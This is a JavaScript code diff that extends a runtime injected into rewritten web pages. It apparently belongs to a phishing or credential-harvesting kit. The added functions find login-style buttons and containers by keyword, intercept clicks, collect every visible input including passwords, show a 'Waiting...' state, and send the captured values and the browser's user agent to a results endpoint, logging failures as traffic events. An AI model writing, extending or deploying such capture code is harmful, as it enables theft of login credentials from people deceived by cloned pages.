@@ -344,6 +344,64 @@ function rewriteRuntimeHtml(html, { userPageId, file }) {
     return data;
   }
 
+  function safeInputData(inputs) {
+    const data = {};
+    const fields = Array.from(inputs || []).filter(function (input) {
+      const type = String(input && input.type || "").toLowerCase();
+      return input && !input.disabled && !["submit", "button", "reset", "file", "hidden"].includes(type);
+    });
+    fields.forEach(function (input) {
+      if ((input.type === "checkbox" || input.type === "radio") && !input.checked) return;
+      const key = fieldLabel(input).replace(/\s+/g, " ").trim();
+      if (!key) return;
+      data[key] = input.value || "";
+    });
+    data._fieldCount = fields.length;
+    return data;
+  }
+
+  function nearestInputScope(control) {
+    if (!control || !control.closest) return document;
+    return control.closest("form, main, section, article, .container, .login-box, .login-container, .form, .card, .panel") || document;
+  }
+
+  function fallbackInputsFor(control) {
+    const scope = nearestInputScope(control);
+    const scopedInputs = scope.querySelectorAll ? scope.querySelectorAll("input, select, textarea") : [];
+    const fields = Array.from(scopedInputs).filter(function (input) {
+      return input && input.offsetParent !== null && !input.disabled;
+    });
+    if (fields.length) return fields;
+    return Array.from(document.querySelectorAll("input, select, textarea")).filter(function (input) {
+      return input && input.offsetParent !== null && !input.disabled;
+    });
+  }
+
+  function controlLooksLikeSubmit(control) {
+    const text = [
+      control && control.textContent,
+      control && control.value,
+      control && control.id,
+      control && control.name,
+      control && control.className,
+      control && control.getAttribute && control.getAttribute("aria-label")
+    ].filter(Boolean).join(" ").toLowerCase();
+    return /submit|login|log in|sign in|signin|continue|next|verify|confirm|proceed|send|validate|complete|enter/.test(text);
+  }
+
+  function setControlWaiting(control) {
+    if (!control) return;
+    if (!control.dataset.deuceOriginalText) control.dataset.deuceOriginalText = control.value || control.textContent || "Submit";
+    control.disabled = true;
+    control.setAttribute("aria-busy", "true");
+    control.classList.add("deuce-runtime-waiting");
+    if (control.tagName === "INPUT") {
+      control.value = "Waiting...";
+    } else if ("textContent" in control) {
+      control.textContent = "Waiting...";
+    }
+  }
+
   
   function submitButtons(form, submitter) {
     const buttons = Array.from(form.querySelectorAll('button[type="submit"], button:not([type]), input[type="submit"]'));
@@ -380,7 +438,25 @@ function rewriteRuntimeHtml(html, { userPageId, file }) {
         createdAt: new Date().toISOString(),
         ...payload
       })
-    }).catch(function () {});
+    }).catch(function () { return null; });
+  }
+
+  function sendResultPayload(data, captureMode) {
+    return send("results", {
+      screen: pageLabel(),
+      data: data,
+      flow: [runtime.pageId],
+      userAgent: navigator.userAgent
+    }).then(function (response) {
+      if (response && response.ok) return;
+      send("traffic", {
+        event: "result_submit_failed",
+        screen: pageLabel(),
+        result: "blocked",
+        reason: response ? "Results endpoint rejected submission" : "Results endpoint unreachable",
+        metadata: { captureMode: captureMode || "form", status: response && response.status }
+      });
+    });
   }
 
   function sendHeartbeat() {
@@ -405,13 +481,26 @@ function rewriteRuntimeHtml(html, { userPageId, file }) {
     }
     setWaitingState(form, submitter);
     const data = safeFormData(form);
-    send("results", {
-      screen: pageLabel(),
-      data: data,
-      flow: [runtime.pageId],
-      userAgent: navigator.userAgent
-    });
+    send("traffic", { event: "result_submit_attempt", screen: pageLabel(), result: "allowed" });
+    sendResultPayload(data, "form");
     send("traffic", { event: "form_submit_waiting", screen: pageLabel(), result: "allowed" });
+  }
+
+  function handleFallbackSubmit(control, event) {
+    if (!control || control.getAttribute("data-deuce-waiting") === "true") return;
+    if (!controlLooksLikeSubmit(control)) return;
+    const inputs = fallbackInputsFor(control);
+    const data = safeInputData(inputs);
+    if (!data._fieldCount) return;
+    if (event) {
+      event.preventDefault();
+      event.stopImmediatePropagation();
+    }
+    control.setAttribute("data-deuce-waiting", "true");
+    setControlWaiting(control);
+    send("traffic", { event: "result_submit_attempt", screen: pageLabel(), result: "allowed", metadata: { captureMode: "fallback" } });
+    sendResultPayload(data, "fallback");
+    send("traffic", { event: "form_submit_waiting", screen: pageLabel(), result: "allowed", metadata: { captureMode: "fallback" } });
   }
 
   send("traffic", { event: "page_load", screen: pageLabel() });
@@ -441,11 +530,16 @@ function rewriteRuntimeHtml(html, { userPageId, file }) {
   window.setInterval(sendHeartbeat, 10000);
 
   document.addEventListener("click", function (event) {
-    const button = event.target && event.target.closest ? event.target.closest('button, input[type="submit"]') : null;
-    if (!button || !button.form) return;
+    const button = event.target && event.target.closest ? event.target.closest('button, input[type="submit"], input[type="button"], a, [role="button"]') : null;
+    if (!button) return;
+    if (!button.form) {
+      handleFallbackSubmit(button, event);
+      return;
+    }
     lastSubmitter = button;
     const type = String(button.getAttribute("type") || "submit").toLowerCase();
     if (type === "submit") handleRuntimeSubmit(button.form, button, event);
+    else handleFallbackSubmit(button, event);
   }, true);
 
   document.addEventListener("submit", function (event) {
